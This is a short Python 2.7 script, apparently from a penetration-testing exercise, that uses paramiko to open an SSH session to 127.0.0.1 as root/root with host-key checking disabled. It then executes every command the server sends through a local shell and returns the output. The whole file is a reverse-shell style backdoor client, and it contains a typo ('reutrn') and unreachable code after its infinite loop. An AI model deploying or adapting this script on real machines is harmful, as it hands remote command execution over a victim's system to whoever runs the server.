#!/usr/bin/python2.7

import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/root/.ssh/know_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd,allow_agent=False,look_for_keys=False)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)#read banner
        while True:
            command = ssh_session.recv(1024) #get the command from the SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    reutrn
ssh_command('127.0.0.1','root','root','ClientConnected')


        
